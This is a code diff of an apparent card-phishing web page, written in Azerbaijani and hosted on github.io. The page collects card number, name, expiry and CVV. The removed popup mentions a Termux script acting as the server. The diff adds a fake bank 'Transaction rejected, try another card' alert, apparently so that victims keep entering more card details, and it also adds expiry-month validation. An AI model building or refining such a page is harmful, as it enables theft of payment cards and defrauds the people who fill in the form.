@@ -32,12 +32,15 @@
         .card-val { font-size: 0.9rem; font-weight: bold; min-height: 18px; text-transform: uppercase; }
 
         /* Giriş Formu */
-        .form-group { margin-bottom: 18px; }
+        .form-group { margin-bottom: 18px; position: relative; }
         .form-group label { display: block; font-size: 0.75rem; font-weight: 700; color: #5f6f95; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
         .form-group input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #e2e8f0; background: #ffffff; font-size: 1.05rem; font-weight: 500; color: #1a202c; outline: none; box-sizing: border-box; transition: border-color 0.2s; }
         .form-group input:focus { border-color: #ff3b30; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
         
+        /* Ay Xətası Mətni */
+        .error-hint { color: #ff3b30; font-size: 0.7rem; font-weight: 600; margin-top: 4px; display: none; position: absolute; bottom: -16px; left: 2px; }
+
         .submit-btn { width: 100%; padding: 16px; background: linear-gradient(90deg, #ff3b30, #e02e24); color: white; border: none; border-radius: 14px; font-size: 1.1rem; font-weight: bold; cursor: pointer; box-shadow: 0 6px 20px rgba(255,59,48,0.3); transition: transform 0.1s, opacity 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .submit-btn:active { transform: scale(0.98); }
         .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; box-shadow: none; }
@@ -45,15 +48,20 @@
         .ssl-info { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 0.8rem; color: #718096; margin-top: 15px; text-align: center; }
         .back-link { display: inline-block; margin-top: 25px; color: #718096; text-decoration: none; font-size: 0.9rem; font-weight: 500; }
 
-        /* Azericard tipli real Pop-up Xətası */
-        .popup-back { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 999; visibility: hidden; opacity: 0; transition: opacity 0.3s; padding: 20px; box-sizing: border-box; }
+        /* Yeni Bank Tipli Pop-up Stil Dəyişiklikləri */
+        .popup-back { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: flex; align-items: center; justify-content: center; z-index: 999; visibility: hidden; opacity: 0; transition: opacity 0.3s; padding: 20px; box-sizing: border-box; }
         .popup-back.visible { visibility: visible; opacity: 1; }
-        .popup-box { background: #ffffff; border-radius: 20px; width: 100%; max-width: 340px; padding: 25px 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); animation: scaleUp 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
+        .popup-box { background: #ffffff; border-radius: 24px; width: 100%; max-width: 330px; padding: 30px 20px; text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.4); animation: scaleUp 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
         @keyframes scaleUp { from { transform: scale(0.85); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-        .popup-title { font-size: 1.15rem; font-weight: 700; color: #2d3748; margin: 0 0 8px 0; }
-        .popup-web { font-size: 1.1rem; font-weight: 600; color: #1a202c; margin-bottom: 15px; border-bottom: 1px solid #edf2f7; padding-bottom: 12px; }
-        .popup-msg { font-size: 0.95rem; color: #4a5568; line-height: 1.4; margin-bottom: 20px; }
-        .popup-btn { width: 100%; padding: 12px; background: #0056ff; color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; }
+        
+        /* Qırmızı Nida Animasiyası */
+        .error-alert-icon { width: 50px; height: 50px; border: 3px solid #ff3b30; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #ff3b30; font-size: 2.2rem; font-weight: bold; margin: 0 auto 15px auto; animation: pulseGlow 1.2s infinite ease-in-out; }
+        @keyframes pulseGlow { 0% { transform: scale(1); opacity: 1; box-shadow: 0 0 0 0 rgba(255, 59, 48, 0.4); } 50% { transform: scale(1.05); opacity: 0.7; box-shadow: 0 0 12px 6px rgba(255, 59, 48, 0.2); } 100% { transform: scale(1); opacity: 1; box-shadow: 0 0 0 0 rgba(255, 59, 48, 0); } }
+        
+        .popup-title { font-size: 1.2rem; font-weight: 700; color: #1a202c; margin-bottom: 8px; }
+        .popup-msg { font-size: 0.95rem; color: #4a5568; line-height: 1.5; margin-bottom: 22px; font-weight: 500; }
+        .popup-btn { width: 100%; padding: 13px; background: #ff3b30; color: white; border: none; border-radius: 12px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+        .popup-btn:hover { background: #e02e24; }
     </style>
 </head>
 <body>
@@ -101,6 +109,7 @@
                 <div class="form-group">
                     <label>BİTMƏ TARİXİ</label>
                     <input type="text" id="cardExp" placeholder="AA/YY" inputmode="numeric" maxlength="5" required autocomplete="off">
+                    <div class="error-hint" id="expError">Ay 12-dən böyük ola bilməz!</div>
                 </div>
                 <div class="form-group">
                     <label>CVV</label>
@@ -123,9 +132,10 @@
 
     <div class="popup-back" id="errPopup">
         <div class="popup-box">
-            <div class="popup-title">maqa085.github.io deyir:</div>
-            <div class="popup-msg">Serverə bağlanmaq mümkün olmadı. Termux skriptinin aktiv olduğundan əmin olun.</div>
-            <button class="popup-btn" onclick="closePopup()">OK</button>
+            <div class="error-alert-icon">!</div>
+            <div class="popup-title">Tranzaksiya rədd edildi</div>
+            <div class="popup-msg">Kartınız ödənişi qəbul etmədi. Başqa kartla yoxlayın.</div>
+            <button class="popup-btn" onclick="closePopup()">Geri qayıt</button>
         </div>
     </div>
 
@@ -147,6 +157,9 @@
         const inpExp = document.getElementById('cardExp');
         const inpCvv = document.getElementById('cardCvv');
         const btn = document.getElementById('btnSubmit');
+        const expError = document.getElementById('expError');
+
+        let isMonthValid = true;
 
         // Canlı Sinxronizasiya Dinləyiciləri
         inpNo.addEventListener('input', (e) => {
@@ -165,6 +178,22 @@
 
         inpExp.addEventListener('input', (e) => {
             let v = e.target.value.replace(/\D/g, '');
+            
+            // Ay dəyərini yoxlamaq üçün ilk iki rəqəmi tuturuq
+            if (v.length >= 2) {
+                let month = parseInt(v.substring(0, 2), 10);
+                if (month > 12) {
+                    expError.style.display = 'block';
+                    isMonthValid = false;
+                } else {
+                    expError.style.display = 'none';
+                    isMonthValid = true;
+                }
+            } else {
+                expError.style.display = 'none';
+                isMonthValid = true;
+            }
+
             let res = v.length >= 2 ? v.substring(0,2) + '/' + v.substring(2,4) : v;
             e.target.value = res;
             document.getElementById('cardViewExp').innerText = res || 'MM/YY';
@@ -181,12 +210,16 @@
             const okName = inpName.value.trim().length >= 4;
             const okExp = inpExp.value.length === 5;
             const okCvv = inpCvv.value.length === 3;
-            btn.disabled = !(okNo && okName && okExp && okCvv);
+            
+            // Əgər ay etibarsızdırsa, bütün form daxil edilsə belə düymə sıfırlanır (disabled qalır)
+            btn.disabled = !(okNo && okName && okExp && okCvv && isMonthValid);
         }
 
         // Göndərmə və Xəta
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
+            if (!isMonthValid) return;
+
             btn.disabled = true;
             btn.innerText = 'Yoxlanılır...';
 
@@ -231,9 +264,11 @@
             document.getElementById('cardViewNo').innerText = '•••• •••• •••• ••••';
             document.getElementById('cardViewName').innerText = '—';
             document.getElementById('cardViewExp').innerText = 'MM/YY';
+            expError.style.display = 'none';
+            isMonthValid = true;
             valForm();
         }
     </script>
 </body>
-                        </html>
-                
+    </html>
+    
